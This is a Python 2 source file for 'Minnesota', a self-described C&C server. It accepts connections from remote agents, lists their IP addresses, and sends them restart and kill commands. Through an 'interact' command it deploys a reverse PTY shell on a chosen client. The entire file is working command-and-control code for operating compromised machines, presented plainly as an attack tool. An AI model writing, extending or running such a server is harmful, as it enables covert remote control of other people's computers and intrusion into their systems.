import os
import sys
import socket
import readline
import ConfigParser

from threading import Thread
from time import sleep

from colored import *
from colorama import *

import tcp_pty_shell_handler


CLIENTS_    = []
CLIENTS_IPS = []
__HISTORY__ = []

COMMANDS = ['start server', 'stop server', 'interact', 'list',
            'help', 'exit','status', 'clear', 'history', 'kill',
            'restart']

__VERSION__ = "0.0.2"

STATUS_SERVER = 0 # 0 = Running
SOCKET_INUSE  = ''

#
# TODO : Inserire controllo continuo connessione internet , e notificare quando
# si e' offline


def help():
        help_menu_0 = '''
Usage : python minnesota.py

C&C server for a SCTP network'''

        help_menu_2 = '''
Minnesota CLI Commands:
    clear           Clear the console
    start server    Start the server and listen for connections
    stop server     Stop the server without killing all connections
    interact        Deploy a shell on the selected client
    list            Print a list of all clients connected
    help            Print this menu
    status          Print the current server status
    history         Print all command executed
    kill  0,1,...   Kill all client by index number
    restart 0,1,... Restart all client by index number
    exit            Exit the server and keep all connections alive'''
        help_menu_3 = '''
Shell Bash Commands:
    *               All shell commands of the running OS are currently supported
    exit            Destroy the shell
    kill            Kill the client connection
        
        '''
        print (fore.PALE_GREEN_3B + help_menu_0 + style.RESET)
        print (fore.DARK_SEA_GREEN_3A + help_menu_2 + style.RESET)
        print (fore.DARK_SLATE_GRAY_3 + help_menu_3 + style.RESET)

def banner():
        # Setting up a nice console for the handler
        # Cleaning up the console by Os
        os.system("clear")

        # Printing a welcome message 
        line1 = ''' __  __ _                             _        
|  \/  (_)_ __  _ __   ___  ___  ___ | |_ __ _ '''
        line2 = '''| |\/| | | '_ \| '_ \ / _ \/ __|/ _ \| __/ _` |'''
        line3 = '''| |  | | | | | | | | |  __/\__ \ (_) | || (_| |''' 
        line4 = '''|_|  |_|_|_| |_|_| |_|\___||___/\___/ \__\__,_|
                                                '''
        welcome_str = "C&C SERVER FOR TCP NETWORK | V%s\n" % __VERSION__   

        lines = ["%s" % line1]
            
        for line in lines:           
            for c in line:           
                sys.stdout.write(fore.DARK_OLIVE_GREEN_3 + style.BOLD + c + style.RESET)
                sys.stdout.flush() 
                sleep(0.001) 
        sys.stdout.write("\n")

        lines = ["%s" % line2]
            
        for line in lines:           
            for c in line:           
                sys.stdout.write(fore.DARK_SEA_GREEN_3B + style.BOLD + c + style.RESET)
                sys.stdout.flush() 
                sleep(0.001) 
        sys.stdout.write("\n")
        lines = ["%s" % line3]
            
        for line in lines:           
            for c in line:           
                sys.stdout.write(fore.DARK_SEA_GREEN_2 + style.BOLD + c + style.RESET)
                sys.stdout.flush() 
                sleep(0.001)
        sys.stdout.write("\n")
        lines = ["%s" % line4]
            
        for line in lines:           
            for c in line:           
                sys.stdout.write(fore.LIGHT_CYAN_3 + style.BOLD + c + style.RESET)
                sys.stdout.flush() 
                sleep(0.001)

        sys.stdout.write("\n")
        lines = ["%s" % welcome_str]

        for line in lines:           
            for c in line:           
                sys.stdout.write(fore.LIGHT_CYAN_3 + style.BOLD + c + style.RESET)
                sys.stdout.flush() 
                sleep(0.001)
        
        sys.stdout.write("\n")

def always_listen():
  global HOST, PORT, STATUS_SERVER
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(MAX_CONN)
  except Exception,e:
          print (fore.LIGHT_RED + "[!] " + style.RESET + "Error : %s." % e)
          os._exit(0)


  while (STATUS_SERVER < 1):
    conn, addr = s.accept()
    CLIENTS_.append(conn)
    CLIENTS_IPS.append(addr)

def ping():
  global CLIENTS_, CLIENTS_IPS, STATUS_SERVER
  while (STATUS_SERVER < 1):
    for client in CLIENTS_:
      if client == SOCKET_INUSE:
        pass
      else:
        try:
          client.send('hello')
        except:
          CLIENTS_IPS.pop(int(CLIENTS_.index(client)))
          CLIENTS_.remove(client)
    sleep(2)

def complete(text, state):
    for cmd in COMMANDS:
        if cmd.startswith(text):
            if not state:
                return cmd
            else:
                state -= 1

def find_between(st,first,last):
    try:
        start = st.index(first)+len(first)
        end = st.index(last,start)
        return st[start:end]
    except ValueError:
        return ""


def parser(command):
  global HOST, PORT, STATUS_SERVER, CLIENTS_, CLIENTS_IPS, RPORT

  if command == "help":
    help()
  elif command == "exit":
    print (fore.LIGHT_RED + "\n[!] " + style.RESET + "Shutting down ...\n")
    os._exit(0)
  elif command == "list":
    try:
        # Print grid
        if not CLIENTS_IPS:
            print (fore.LIGHT_RED  + "[!] " + style.RESET + "No connections stored yet." )
        else:
          sys.stdout.write(fore.LIGHT_CYAN_3 + "\n" + style.UNDERLINED + "Index" + style.RESET + "\t" + style.RESET )
          sys.stdout.write(fore.LIGHT_CYAN_3 + "\t" + style.UNDERLINED + "Ip Address" + style.RESET + "\n")
          for client in CLIENTS_IPS:
              sys.stdout.write(fore.WHITE + "\n%s" % CLIENTS_IPS.index(client) + style.RESET + ")\t")
              buffer = CLIENTS_IPS[int(CLIENTS_IPS.index(client))]
              buffer = find_between(str(buffer), "'", "'")
              sys.stdout.write(fore.WHITE + "\t%s" % buffer + style.RESET )
              
          sys.stdout.write("\n\n")
    except Exception,e:
        print (fore.LIGHT_RED + "[!] " + style.RESET + "Error : %s." % e )

  elif command == "start server":
    if STATUS_SERVER == 0:
      print (fore.GREEN_1 + "[*] " + style.RESET + "Server already online on " + HOST + ":" + str(PORT)) 
    else:
      try:
        print (fore.GREEN_1 + "[*] " + style.RESET + "Starting server ...")
        STATUS_SERVER = 0
        sleep(1)
        print (fore.GREEN_1 + "[+] " + style.RESET + "Ok." )
      except Exception,e:
          print (fore.LIGHT_RED + "[!] " + style.RESET + "Error : %s." % e )

  elif command == "stop server":
    if STATUS_SERVER == 1:
      print (fore.LIGHT_RED + "[!] " + style.RESET + "Server already offline.")
    else:
      try:
        print (fore.BLUE_3B + "[*] " + style.RESET + "Stopping server ..." )
        STATUS_SERVER += 1
        CLIENTS_ = []
        CLIENTS_IPS = []
        sleep(1)
        print (fore.GREEN_1 + "[+] " + style.RESET + "Ok." )
      except Exception,e:
          print (fore.LIGHT_RED + "[!] " + style.RESET + "Error : %s." % e )

  elif command == "status":
    if STATUS_SERVER == 1 :
        print (fore.LIGHT_RED + "[!] " + style.RESET + " Offline.")
    elif STATUS_SERVER == 0:
        print (fore.GREEN_1 + "[+] " + style.RESET + "Online on " + HOST + ":" + str(PORT)) 

  elif command == "history":
      print ""
      for cmd in __HISTORY__:
        print (fore.DARK_ORANGE_3A + style.BLINK + style.BOLD +  cmd + style.RESET)

  elif command.startswith("restart"):
    index = command.split(" ")[1]
    index = index.split(",")
    for element in index:
      remote_ip = CLIENTS_IPS[int(element)]
      try:
        attual_socket = CLIENTS_[int(element)]
        attual_socket.send("restart")
        print (fore.BLUE_3B + "[*] " + style.RESET + "Restarted agent on : %s." % str(find_between(str(remote_ip), "'", "'"))  )
      except Exception,e:
          print (fore.LIGHT_RED + "[!] " + style.RESET + "Error : %s." % e + style.RESET)
    print "\n"
  elif command.startswith("interact "):
    try:
      index = command.split(" ")[1]
      attual_socket = CLIENTS_[int(index)]
      remote_ip     = CLIENTS_IPS[int(index)]
      print (fore.BLUE_3B + "[*] "+ style.RESET + "Deploying reverse shell on %s:%s" % (str(find_between(str(remote_ip), "'", "'")),str(RPORT))   )
      SOCKET_INUSE  = attual_socket
      print (fore.BLUE_3B + "[*] "+ style.RESET + "Setting up remote PTY handler ...")
      attual_socket.send("shell")
      print (fore.GREEN_1 + style.BLINK +  "[*] "+ style.RESET + "Minnesota PTY shell deployed successfully (%s:%s -> %s:%s)\n" % (str(find_between(str(remote_ip), "'", "'")),str(RPORT),HOST,str(PORT) )  )
      tcp_pty_shell_handler.run(HOST,RPORT)
      print (fore.BLUE_3B + "[*] "+ style.RESET + "Killing Minnesota PTY shell ...")
      sleep(1)
      print (fore.BLUE_3B + "[*] "+ style.RESET + "%s:%s - Minnesota PTY shell destroyed." % (str(find_between(str(remote_ip), "'", "'")),str(RPORT))   )
    except Exception,e:
      print (fore.LIGHT_RED + "[!] Error Deploying : %s." % e + style.RESET)
  elif command == "clear":
    banner()
  elif command.startswith("kill "):
    index = command.split(" ")[1]
    index = index.split(",")
    for element in index:
      try:
        attual_socket = CLIENTS_[int(element)]
        attual_socket.send("kill")
        print (fore.BLUE_3B + "[*] " + style.RESET + "Killing : %s." % str(element))
      except Exception,e:
          print (fore.LIGHT_RED + "[!] " + style.RESET + "Error : %s." % e + style.RESET)
    print "\n"

def command_line():
  while True:
     # Signal var handler        
    readline.parse_and_bind("tab: complete")
    readline.set_completer(complete)
    sys.stdout.write(style.UNDERLINED + "mnstconsole >" + style.RESET)
    internal_command = raw_input (" ")
    if "history" in internal_command :
      pass
    else:
      __HISTORY__.append(internal_command)
    parser(internal_command)

def run():
  global HOST, PORT , RPORT, MAX_CONN
  
  banner()

  config = ConfigParser.RawConfigParser()   
  this_dir, this_filename = os.path.split(__file__)
  DATA_PATH = os.path.join(this_dir, "conf", "server.conf")

  config.read(DATA_PATH)

  HOST = config.get('config', 'HOST')
  PORT = int(config.get('config', 'PORT'))
  RPORT = int(config.get('config', 'RPORT'))
  MAX_CONN = int(config.get('config', 'MAX_CONN'))


  thread = Thread(target = always_listen)
  thread.start()


  thread1 = Thread(target = command_line)
  thread1.start()

  thread2 = Thread(target = ping)
  thread2.start()


